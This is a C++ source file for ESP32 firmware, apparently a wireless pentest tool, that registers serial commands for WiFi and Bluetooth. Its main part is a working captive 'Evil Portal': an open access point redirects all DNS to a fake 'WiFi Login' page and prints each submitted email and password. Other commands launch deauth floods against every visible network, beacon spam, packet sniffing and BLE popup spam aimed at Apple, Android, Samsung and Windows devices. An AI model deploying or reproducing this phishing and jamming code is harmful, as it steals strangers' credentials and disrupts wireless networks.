#include "wifi_commands.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include <globals.h>
#include <modules/ethernet/ARPScanner.h>
#include "esp_netif.h"          
#include "esp_netif_net_stack.h"
#include "esp_mac.h"
#include "modules/wifi/tcp_utils.h"
#include "modules/wifi/sniffer.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/wifi_atks.h"
#include "modules/ble/ble_spam.h"
#include "modules/ble/ble_common.h"
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

// ============================================================================
// Headless Captive Portal (for serial control)
// ============================================================================

static AsyncWebServer* portalServer = nullptr;
static DNSServer* portalDns = nullptr;
static bool portalRunning = false;
static int portalCredCount = 0;
static String portalSsid = "";

static const char CAPTIVE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #45a049; }
        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>Connect to WiFi</h1>
        <form action="/post" method="POST">
            <input type="text" name="email" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
)rawliteral";

static const char CAPTIVE_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Connecting...</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
        .spinner { font-size: 48px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner">⏳</div>
    <h2>Connecting to WiFi...</h2>
    <p>Please wait while we verify your credentials.</p>
</body>
</html>
)rawliteral";

void stopHeadlessPortal() {
    if (portalServer) {
        portalServer->end();
        delete portalServer;
        portalServer = nullptr;
    }
    if (portalDns) {
        portalDns->stop();
        delete portalDns;
        portalDns = nullptr;
    }
    portalRunning = false;
    wifiDisconnect();
    serialDevice->println("Evil Portal stopped.");
    serialDevice->println("Total credentials captured: " + String(portalCredCount));
}

void startHeadlessPortal(String ssid, uint8_t channel) {
    if (portalRunning) {
        stopHeadlessPortal();
    }
    
    portalSsid = ssid;
    portalCredCount = 0;
    
    // Start AP
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str(), "", channel);
    wifiConnected = true;
    
    delay(500);
    
    // Create servers
    portalServer = new AsyncWebServer(80);
    portalDns = new DNSServer();
    
    // DNS redirect all to us
    portalDns->start(53, "*", WiFi.softAPIP());
    
    // Routes
    portalServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", CAPTIVE_HTML);
    });
    
    portalServer->on("/post", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = "";
        String password = "";
        
        if (request->hasParam("email", true)) {
            email = request->getParam("email", true)->value();
        }
        if (request->hasParam("password", true)) {
            password = request->getParam("password", true)->value();
        }
        
        if (email.length() > 0 || password.length() > 0) {
            portalCredCount++;
            serialDevice->println("─────────────────────────────────");
            serialDevice->println("[CAPTURED #" + String(portalCredCount) + "]");
            serialDevice->println("  SSID: " + portalSsid);
            serialDevice->println("  User: " + email);
            serialDevice->println("  Pass: " + password);
            serialDevice->println("─────────────────────────────────");
        }
        
        request->send_P(200, "text/html", CAPTIVE_SUCCESS);
    });
    
    // Captive portal detection endpoints
    portalServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    portalServer->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    portalServer->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    portalServer->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    // Catch-all
    portalServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    portalServer->begin();
    portalRunning = true;
    
    serialDevice->println("=================================");
    serialDevice->println("Evil Portal ACTIVE");
    serialDevice->println("  SSID: " + ssid);
    serialDevice->println("  Channel: " + String(channel));
    serialDevice->println("  IP: 192.168.4.1");
    serialDevice->println("─────────────────────────────────");
    serialDevice->println("Waiting for victims...");
    serialDevice->println("Send 'portalstop' to stop");
    serialDevice->println("=================================");
}

uint32_t portalStopCallback(cmd *c) {
    if (portalRunning) {
        stopHeadlessPortal();
    } else {
        serialDevice->println("No portal running.");
    }
    return true;
}

// ============================================================================
// WiFi Basic Commands
// ============================================================================

uint32_t wifiCallback(cmd *c) {
    Command cmd(c);
    Argument statusArg = cmd.getArgument("status");
    String status = statusArg.getValue();
    status.trim();

    Argument ssidArg = cmd.getArgument("ssid");
    String ssid = ssidArg.getValue();
    ssid.trim();

    Argument pwdArg = cmd.getArgument("pwd");
    String pwd = pwdArg.getValue();
    pwd.trim();

    if (status == "off") {
        wifiDisconnect();
        serialDevice->println("WiFi disconnected");
        return true;
    } else if (status == "on") {
        if (wifiConnected) {
            serialDevice->println("WiFi already connected");
            return true;
        }
        serialDevice->println("Connecting to known network...");
        if (wifiConnecttoKnownNet()) {
            serialDevice->println("Connected to: " + WiFi.SSID());
            serialDevice->println("IP: " + WiFi.localIP().toString());
            return true;
        }
        wifiDisconnect();
        serialDevice->println("No known network found, starting AP mode...");
        return _setupAP();

    } else if (status == "ap") {
        serialDevice->println("Starting Access Point...");
        _setupAP();
        serialDevice->println("AP SSID: " + String(bruceConfig.wifiAp.ssid));
        serialDevice->println("AP Password: " + String(bruceConfig.wifiAp.pwd));
        serialDevice->println("AP IP: 192.168.4.1");
        return true;
        
    } else if (status == "scan") {
        serialDevice->println("Scanning for WiFi networks...");
        int n = WiFi.scanNetworks();
        serialDevice->println("Found " + String(n) + " networks:");
        for (int i = 0; i < n; i++) {
            serialDevice->printf("%d. %s (Ch:%d, RSSI:%d, %s)\n", 
                i + 1, 
                WiFi.SSID(i).c_str(), 
                WiFi.channel(i),
                WiFi.RSSI(i),
                WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "Open" : "Encrypted");
        }
        return true;
        
    } else if (status == "info") {
        serialDevice->println("=== WiFi Info ===");
        serialDevice->println("Status: " + String(wifiConnected ? "Connected" : "Disconnected"));
        if (wifiConnected) {
            serialDevice->println("SSID: " + WiFi.SSID());
            serialDevice->println("IP: " + WiFi.localIP().toString());
            serialDevice->println("Gateway: " + WiFi.gatewayIP().toString());
            serialDevice->println("Channel: " + String(WiFi.channel()));
            serialDevice->println("RSSI: " + String(WiFi.RSSI()) + " dBm");
        }
        serialDevice->println("MAC: " + WiFi.macAddress());
        return true;
        
    } else if (status == "add" && ssid != "" && pwd != "") {
        bruceConfig.addWifiCredential(ssid, pwd);
        serialDevice->println("Added WiFi credentials for: " + ssid);
        return true;
        
    } else if (status == "connect" && ssid != "") {
        serialDevice->println("Connecting to: " + ssid);
        WiFi.begin(ssid.c_str(), pwd.c_str());
        int timeout = 20;
        while (WiFi.status() != WL_CONNECTED && timeout > 0) {
            delay(500);
            serialDevice->print(".");
            timeout--;
        }
        if (WiFi.status() == WL_CONNECTED) {
            wifiConnected = true;
            serialDevice->println("\nConnected!");
            serialDevice->println("IP: " + WiFi.localIP().toString());
            return true;
        } else {
            serialDevice->println("\nConnection failed!");
            return false;
        }
    } else {
        serialDevice->println(
            "WiFi Commands:\n"
            "  wifi on              - Connect to known network or start AP\n"
            "  wifi off             - Disconnect WiFi\n"
            "  wifi ap              - Start Access Point\n"
            "  wifi scan            - Scan for networks\n"
            "  wifi info            - Show WiFi info\n"
            "  wifi add <ssid> <pw> - Add credentials\n"
            "  wifi connect <ssid> [pw] - Connect to specific network"
        );
        return false;
    }
}

uint32_t webuiCallback(cmd *c) {
    Command cmd(c);
    Argument arg = cmd.getArgument("noAp");
    bool noAp = arg.isSet();

    serialDevice->println(String("Starting Web UI in ") + (noAp ? "STA" : "AP") + " mode");
    serialDevice->println("URL: http://" + (noAp ? WiFi.localIP().toString() : "192.168.4.1"));
    serialDevice->println("Login: admin / bruce");
    serialDevice->println("Press ESC to quit");
    startWebUi(!noAp);
    return true;
}

// ============================================================================
// WiFi Attack Commands
// ============================================================================

uint32_t scanHostsCallback(cmd *c) {
    esp_netif_t *esp_netinterface = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (esp_netinterface == nullptr) {
        serialDevice->println("Not connected to a network. Use 'wifi on' first.");
        return false;
    }
    serialDevice->println("Scanning for hosts on network...");
    ARPScanner{esp_netinterface};
    return true;
}

uint32_t snifferCallback(cmd *c) {
    serialDevice->println("Starting WiFi packet sniffer...");
    serialDevice->println("Packets will be saved to PCAP file.");
    serialDevice->println("Press ESC to stop.");
    sniffer_setup();
    return true;
}

uint32_t evilportalCallback(cmd *c) {
    Command cmd(c);
    
    Argument ssidArg = cmd.getArgument("ssid");
    String ssid = ssidArg.getValue();
    ssid.trim();
    if (ssid == "") ssid = "Free WiFi";
    
    Argument channelArg = cmd.getArgument("channel");
    String channelStr = channelArg.getValue();
    uint8_t channel = channelStr.toInt();
    if (channel < 1 || channel > 13) channel = 6;
    
    // Use headless portal for serial control
    startHeadlessPortal(ssid, channel);
    return true;
}

uint32_t deauthCallback(cmd *c) {
    Command cmd(c);
    
    Argument targetArg = cmd.getArgument("target");
    String target = targetArg.getValue();
    target.trim();
    
    if (target == "flood") {
        serialDevice->println("Starting deauth flood attack...");
        serialDevice->println("This will deauth all clients from all visible APs.");
        serialDevice->println("Press ESC to stop.");
        deauthFloodAttack();
        return true;
    } else if (target == "scan") {
        serialDevice->println("Scanning for targets...");
        int n = WiFi.scanNetworks();
        serialDevice->println("Found " + String(n) + " networks:");
        for (int i = 0; i < n; i++) {
            serialDevice->printf("%d. %s (Ch:%d, MAC:%s)\n", 
                i + 1, 
                WiFi.SSID(i).c_str(), 
                WiFi.channel(i),
                WiFi.BSSIDstr(i).c_str());
        }
        return true;
    } else {
        serialDevice->println(
            "Deauth Commands:\n"
            "  deauth flood  - Deauth all visible networks\n"
            "  deauth scan   - Scan for target networks"
        );
        return false;
    }
}

uint32_t beaconCallback(cmd *c) {
    serialDevice->println("Starting beacon spam attack...");
    serialDevice->println("Broadcasting fake WiFi networks.");
    serialDevice->println("Press ESC to stop.");
    beaconAttack();
    return true;
}

uint32_t listenTCPCallback(cmd *c) {
    if (!wifiConnected) {
        serialDevice->println("Not connected. Use 'wifi on' first.");
        return false;
    }
    serialDevice->println("Starting TCP listener...");
    listenTcpPort();
    return true;
}

// ============================================================================
// Bluetooth Commands  
// ============================================================================

uint32_t bleScanCallback(cmd *c) {
    serialDevice->println("Starting BLE scan...");
    serialDevice->println("Press ESC to stop.");
    ble_scan();
    return true;
}

uint32_t bleSpamCallback(cmd *c) {
    Command cmd(c);
    
    Argument typeArg = cmd.getArgument("type");
    String type = typeArg.getValue();
    type.trim();
    type.toLowerCase();
    
    int bleChoice = 0;
    
    if (type == "apple" || type == "ios" || type == "iphone") {
        bleChoice = 1;
        serialDevice->println("Starting Apple/iOS BLE spam...");
    } else if (type == "android" || type == "google") {
        bleChoice = 2;
        serialDevice->println("Starting Android/Google BLE spam...");
    } else if (type == "samsung") {
        bleChoice = 3;
        serialDevice->println("Starting Samsung BLE spam...");
    } else if (type == "windows" || type == "microsoft") {
        bleChoice = 4;
        serialDevice->println("Starting Windows/Microsoft BLE spam...");
    } else if (type == "all" || type == "random") {
        bleChoice = 0;
        serialDevice->println("Starting random BLE spam (all devices)...");
    } else {
        serialDevice->println(
            "BLE Spam Types:\n"
            "  blespam apple     - Apple/iOS popup spam\n"
            "  blespam android   - Android/Google popup spam\n"
            "  blespam samsung   - Samsung popup spam\n"
            "  blespam windows   - Windows/Microsoft popup spam\n"
            "  blespam all       - Random spam all types"
        );
        return false;
    }
    
    serialDevice->println("Press ESC to stop.");
    aj_adv(bleChoice);
    return true;
}

uint32_t ibeaconCallback(cmd *c) {
    Command cmd(c);
    
    Argument nameArg = cmd.getArgument("name");
    String name = nameArg.getValue();
    name.trim();
    if (name == "") name = "Bruce iBeacon";
    
    serialDevice->println("Starting iBeacon broadcast...");
    serialDevice->println("Name: " + name);
    serialDevice->println("Press ESC to stop.");
    
    ibeacon(name.c_str());
    return true;
}

uint32_t bleInfoCallback(cmd *c) {
    serialDevice->println("=== Bluetooth Info ===");
    serialDevice->println("BLE Status: Enabled");
    uint8_t mac[6];
    esp_read_mac(mac, ESP_MAC_BT);
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    serialDevice->println("BT MAC: " + String(macStr));
    return true;
}

// ============================================================================
// WiFi Help Command
// ============================================================================

uint32_t wifiHelpCallback(cmd *c) {
    serialDevice->println(
        "\n"
        "=== BRUCE WiFi/BLE Serial Commands ===\n"
        "\n"
        "WiFi Commands:\n"
        "  wifi on/off/ap/scan/info   - WiFi control\n"
        "  wifi add <ssid> <pwd>      - Save credentials\n"
        "  wifi connect <ssid> [pwd]  - Connect to network\n"
        "  webui [-noAp]              - Start Web UI\n"
        "\n"
        "WiFi Attacks:\n"
        "  evilportal [ssid] [-c ch]  - Start Evil Portal\n"
        "  portalstop                 - Stop Evil Portal\n"
        "  deauth flood/scan          - Deauth attack\n"
        "  beacon                     - Beacon spam\n"
        "  sniffer                    - Packet sniffer\n"
        "  arp                        - Scan network hosts\n"
        "  listen                     - TCP listener\n"
        "\n"
        "Bluetooth:\n"
        "  blescan                    - Scan BLE devices\n"
        "  blespam <type>             - BLE popup spam\n"
        "    Types: apple/android/samsung/windows/all\n"
        "  ibeacon [name]             - Broadcast iBeacon\n"
        "  bleinfo                    - Show BT info\n"
    );
    return true;
}

// ============================================================================
// Command Registration
// ============================================================================

void createWifiCommands(SimpleCLI *cli) {
    // Basic WiFi
    Command wifiCmd = cli->addCommand("wifi", wifiCallback);
    wifiCmd.addPosArg("status");
    wifiCmd.addPosArg("ssid", "");
    wifiCmd.addPosArg("pwd", "");

    Command webuiCmd = cli->addCommand("webui", webuiCallback);
    webuiCmd.addFlagArg("noAp");

    #if !defined(LITE_VERSION)
    
    // WiFi Attacks
    Command arpCmd = cli->addCommand("arp", scanHostsCallback);
    
    Command snifferCmd = cli->addCommand("sniffer", snifferCallback);
    
    Command listenCmd = cli->addCommand("listen", listenTCPCallback);
    
    Command evilportalCmd = cli->addCommand("evilportal", evilportalCallback);
    evilportalCmd.addPosArg("ssid", "Free WiFi");
    evilportalCmd.addArg("c/hannel", "6");
    
    Command portalStopCmd = cli->addCommand("portalstop", portalStopCallback);
    
    Command deauthCmd = cli->addCommand("deauth", deauthCallback);
    deauthCmd.addPosArg("target", "");
    
    Command beaconCmd = cli->addCommand("beacon", beaconCallback);
    
    // Bluetooth Commands
    Command bleScanCmd = cli->addCommand("blescan", bleScanCallback);
    
    Command bleSpamCmd = cli->addCommand("blespam", bleSpamCallback);
    bleSpamCmd.addPosArg("type", "all");
    
    Command ibeaconCmd = cli->addCommand("ibeacon", ibeaconCallback);
    ibeaconCmd.addPosArg("name", "Bruce iBeacon");
    
    Command bleInfoCmd = cli->addCommand("bleinfo", bleInfoCallback);
    
    // WiFi/BLE Help
    Command wifiHelpCmd = cli->addCommand("wifihelp", wifiHelpCallback);
    
    #endif
}
